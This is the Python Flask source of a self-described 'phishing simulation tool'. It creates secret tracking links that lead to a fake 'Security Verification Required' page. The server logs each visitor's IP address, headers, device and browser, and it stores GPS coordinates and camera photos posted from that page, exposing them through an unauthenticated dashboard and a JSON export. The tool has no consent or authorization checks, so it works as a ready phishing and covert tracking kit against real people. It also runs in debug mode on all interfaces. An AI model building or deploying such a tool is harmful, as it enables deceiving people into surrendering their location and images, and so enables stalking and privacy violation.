"""
IP Tracker Pro - Phishing Simulation Tool
Flask-based web application for authorized penetration testing
"""

from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
import json
import os
import secrets
from datetime import datetime
import base64
from io import BytesIO
from PIL import Image
import re

app = Flask(__name__)
CORS(app)

# Configuration
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')
CAMPAIGNS_DIR = os.path.join(DATA_DIR, 'campaigns')
RESULTS_DIR = os.path.join(DATA_DIR, 'results')

# Ensure directories exist
os.makedirs(CAMPAIGNS_DIR, exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)

# ==================== HELPER FUNCTIONS ====================

def parse_user_agent(ua):
    """Parse user agent to extract device type"""
    device = 'Desktop'
    if re.search(r'Mobile|Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini', ua, re.IGNORECASE):
        device = 'Mobile'
        if re.search(r'iPad|Tablet|Silk', ua, re.IGNORECASE):
            device = 'Tablet'
    return device

def parse_browser(ua):
    """Extract browser name and version"""
    patterns = [
        (r'Firefox/([\d.]+)', 'Firefox {}'),
        (r'Edg/([\d.]+)', 'Edge {}'),
        (r'OPR/([\d.]+)', 'Opera {}'),
        (r'Chrome/([\d.]+)', 'Chrome {}'),
        (r'Safari/([\d.]+)', 'Safari {}'),
    ]
    
    for pattern, fmt in patterns:
        match = re.search(pattern, ua)
        if match:
            return fmt.format(match.group(1))
    return 'Unknown'

def parse_os(ua):
    """Extract operating system"""
    patterns = [
        (r'Windows NT ([\d.]+)', {
            '10.0': 'Windows 10',
            '6.3': 'Windows 8.1',
            '6.2': 'Windows 8',
            '6.1': 'Windows 7'
        }),
        (r'Mac OS X ([\d_]+)', lambda x: f"macOS {x.replace('_', '.')}"),
        (r'Android ([\d.]+)', lambda x: f"Android {x}"),
        (r'iPhone|iPad|iPod', 'iOS'),
        (r'Linux', 'Linux'),
    ]
    
    for pattern, mapping in patterns:
        match = re.search(pattern, ua)
        if match:
            if isinstance(mapping, dict):
                return mapping.get(match.group(1), match.group(1))
            elif callable(mapping):
                return mapping(match.group(1))
            else:
                return mapping
    return 'Unknown'

def get_client_ip():
    """Get client's real IP address"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

# ==================== MAIN ROUTES ====================

@app.route('/')
def index():
    """Main campaign builder page"""
    return render_template('index.html')

@app.route('/api/generate', methods=['POST'])
def generate_campaign():
    """Generate a new phishing campaign"""
    data = request.get_json()
    
    # Validate input
    tracking_level = int(data.get('tracking_level', 0))
    if tracking_level < 1 or tracking_level > 3:
        return jsonify({'success': False, 'message': 'Invalid tracking level'}), 400
    
    # Generate IDs
    campaign_id = secrets.token_hex(16)
    secret = secrets.token_hex(8)
    
    # Store campaign config
    config = {
        'id': campaign_id,
        'level': tracking_level,
        'title': data.get('page_title', 'Security Verification Required'),
        'redirect': data.get('redirect_url', ''),
        'message': data.get('custom_message', 'Verifying your identity, please wait...'),
        'created_at': datetime.now().isoformat(),
        'secret': secret
    }
    
    config_path = os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.json')
    with open(config_path, 'w') as f:
        json.dump(config, f, indent=2)
    
    # Build tracking link
    protocol = 'https' if request.scheme == 'https' else 'http'
    host = request.host
    base_path = request.url_root.rstrip('/')
    track_link = f"{base_path}/track?id={campaign_id}&s={secret}"
    
    return jsonify({
        'success': True,
        'link': track_link,
        'id': campaign_id
    })

@app.route('/track')
def track():
    """The phishing page that users visit"""
    campaign_id = request.args.get('id', '')
    secret = request.args.get('s', '')
    
    config_path = os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.json')
    if not os.path.exists(config_path):
        return 'Invalid link.', 404
    
    with open(config_path, 'r') as f:
        config = json.load(f)
    
    if config.get('secret') != secret:
        return 'Invalid link.', 403
    
    return render_template('track.html', config=config, campaign_id=campaign_id)

@app.route('/api/capture', methods=['POST'])
def capture_data():
    """Handle data capture from tracking page"""
    data = request.get_json()
    action = data.get('action', '')
    campaign_id = data.get('campaign_id', '')
    
    if action == 'ip_info':
        session_id = secrets.token_hex(12)
        
        # Collect IP and device info
        ip_data = {
            'session_id': session_id,
            'timestamp': datetime.now().isoformat(),
            'campaign_id': campaign_id,
            'ip_address': get_client_ip(),
            'user_agent': request.headers.get('User-Agent', 'unknown'),
            'referer': request.headers.get('Referer', ''),
            'accept_language': request.headers.get('Accept-Language', ''),
            'x_forwarded_for': request.headers.get('X-Forwarded-For', ''),
            'device': parse_user_agent(request.headers.get('User-Agent', '')),
            'browser': parse_browser(request.headers.get('User-Agent', '')),
            'os': parse_os(request.headers.get('User-Agent', '')),
            'is_forwarded': data.get('forwarded', False)
        }
        
        # Save IP data
        ip_file = os.path.join(RESULTS_DIR, f'{session_id}_ip.json')
        with open(ip_file, 'w') as f:
            json.dump(ip_data, f, indent=2)
        
        # Update campaign log
        log_file = os.path.join(RESULTS_DIR, f'campaign_{campaign_id}.json')
        log_data = {'hits': []}
        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                log_data = json.load(f)
        
        log_data['hits'].append({
            'session_id': session_id,
            'type': 'ip_info',
            'timestamp': datetime.now().isoformat(),
            'ip': ip_data['ip_address']
        })
        
        with open(log_file, 'w') as f:
            json.dump(log_data, f, indent=2)
        
        return jsonify({'success': True, 'session_id': session_id})
    
    elif action == 'gps':
        session_id = data.get('session_id', '')
        
        gps_data = {
            'session_id': session_id,
            'timestamp': datetime.now().isoformat(),
            'latitude': data.get('latitude'),
            'longitude': data.get('longitude'),
            'accuracy': data.get('accuracy'),
            'google_maps': f"https://www.google.com/maps?q={data.get('latitude')},{data.get('longitude')}" 
                          if data.get('latitude') and data.get('longitude') else ''
        }
        
        gps_file = os.path.join(RESULTS_DIR, f'{session_id}_gps.json')
        with open(gps_file, 'w') as f:
            json.dump(gps_data, f, indent=2)
        
        return jsonify({'success': True})
    
    elif action == 'photos':
        session_id = data.get('session_id', '')
        photos = data.get('photos', [])
        
        photo_dir = os.path.join(RESULTS_DIR, 'photos', session_id)
        os.makedirs(photo_dir, exist_ok=True)
        
        photo_records = []
        for idx, photo_base64 in enumerate(photos):
            try:
                # Decode base64 image
                if photo_base64.startswith('data:image'):
                    # Extract base64 part
                    image_data = photo_base64.split(',')[1]
                else:
                    image_data = photo_base64
                
                # Decode and save
                image_bytes = base64.b64decode(image_data)
                image = Image.open(BytesIO(image_bytes))
                
                filename = f'photo_{idx + 1}.jpg'
                image_path = os.path.join(photo_dir, filename)
                image.save(image_path, 'JPEG', quality=85)
                photo_records.append(filename)
            except Exception as e:
                print(f"Error saving photo {idx}: {e}")
        
        photo_data = {
            'session_id': session_id,
            'timestamp': datetime.now().isoformat(),
            'count': len(photo_records),
            'photos': photo_records,
            'directory': photo_dir
        }
        
        photo_file = os.path.join(RESULTS_DIR, f'{session_id}_photos.json')
        with open(photo_file, 'w') as f:
            json.dump(photo_data, f, indent=2)
        
        return jsonify({'success': True, 'count': len(photo_records)})
    
    return jsonify({'success': False, 'message': 'Invalid action'}), 400

# ==================== DASHBOARD ROUTES ====================

@app.route('/dashboard')
def dashboard():
    """Display campaign results dashboard"""
    return render_template('dashboard.html')

@app.route('/api/dashboard/stats')
def get_stats():
    """Get dashboard statistics"""
    stats = {
        'total': 0,
        'unique_ips': set(),
        'gps_captures': 0,
        'photo_captures': 0,
        'sessions': []
    }
    
    # Get all IP files
    ip_files = [f for f in os.listdir(RESULTS_DIR) if f.endswith('_ip.json')]
    
    for ip_file in ip_files:
        ip_path = os.path.join(RESULTS_DIR, ip_file)
        with open(ip_path, 'r') as f:
            ip_data = json.load(f)
        
        session_id = ip_data['session_id']
        stats['total'] += 1
        stats['unique_ips'].add(ip_data['ip_address'])
        
        # Check for GPS and photos
        has_gps = os.path.exists(os.path.join(RESULTS_DIR, f'{session_id}_gps.json'))
        has_photos = os.path.exists(os.path.join(RESULTS_DIR, f'{session_id}_photos.json'))
        
        if has_gps:
            stats['gps_captures'] += 1
        if has_photos:
            stats['photo_captures'] += 1
        
        stats['sessions'].append({
            'session_id': session_id,
            'timestamp': ip_data['timestamp'],
            'ip': ip_data['ip_address'],
            'device': ip_data['device'],
            'browser': ip_data['browser'],
            'os': ip_data['os'],
            'has_gps': has_gps,
            'has_photos': has_photos,
            'is_forwarded': ip_data.get('is_forwarded', False)
        })
    
    stats['unique_ips'] = len(stats['unique_ips'])
    stats['sessions'].sort(key=lambda x: x['timestamp'], reverse=True)
    
    return jsonify(stats)

@app.route('/api/dashboard/session/<session_id>')
def get_session_details(session_id):
    """Get detailed information for a session"""
    details = {}
    
    # Get IP data
    ip_file = os.path.join(RESULTS_DIR, f'{session_id}_ip.json')
    if os.path.exists(ip_file):
        with open(ip_file, 'r') as f:
            details['ip'] = json.load(f)
    
    # Get GPS data
    gps_file = os.path.join(RESULTS_DIR, f'{session_id}_gps.json')
    if os.path.exists(gps_file):
        with open(gps_file, 'r') as f:
            details['gps'] = json.load(f)
    
    # Get photo data
    photo_file = os.path.join(RESULTS_DIR, f'{session_id}_photos.json')
    if os.path.exists(photo_file):
        with open(photo_file, 'r') as f:
            photo_info = json.load(f)
            details['photos'] = photo_info
            
            # Get photo images as base64
            photo_dir = photo_info['directory']
            photos_base64 = []
            if os.path.exists(photo_dir):
                for photo_name in sorted(os.listdir(photo_dir)):
                    photo_path = os.path.join(photo_dir, photo_name)
                    if os.path.isfile(photo_path):
                        with open(photo_path, 'rb') as f:
                            b64 = base64.b64encode(f.read()).decode()
                            photos_base64.append({
                                'name': photo_name,
                                'data': f'data:image/jpeg;base64,{b64}'
                            })
            details['photos_base64'] = photos_base64
    
    if not details:
        return jsonify({'error': 'Session not found'}), 404
    
    return jsonify(details)

@app.route('/api/dashboard/export')
def export_data():
    """Export all captured data as JSON"""
    export_data = {
        'exported_at': datetime.now().isoformat(),
        'sessions': []
    }
    
    ip_files = [f for f in os.listdir(RESULTS_DIR) if f.endswith('_ip.json')]
    
    for ip_file in ip_files:
        session_id = ip_file.replace('_ip.json', '')
        session_data = {}
        
        # Get IP data
        ip_path = os.path.join(RESULTS_DIR, ip_file)
        with open(ip_path, 'r') as f:
            session_data['ip'] = json.load(f)
        
        # Get GPS data
        gps_path = os.path.join(RESULTS_DIR, f'{session_id}_gps.json')
        if os.path.exists(gps_path):
            with open(gps_path, 'r') as f:
                session_data['gps'] = json.load(f)
        
        # Get photo metadata
        photo_path = os.path.join(RESULTS_DIR, f'{session_id}_photos.json')
        if os.path.exists(photo_path):
            with open(photo_path, 'r') as f:
                session_data['photos'] = json.load(f)
        
        export_data['sessions'].append(session_data)
    
    export_json = json.dumps(export_data, indent=2)
    
    return send_file(
        BytesIO(export_json.encode()),
        mimetype='application/json',
        as_attachment=True,
        download_name=f'iptracker_export_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    )

# ==================== ERROR HANDLERS ====================

@app.errorhandler(404)
def not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    # For development only - use a proper WSGI server in production
    app.run(debug=True, host='0.0.0.0', port=5000, ssl_context='adhoc')
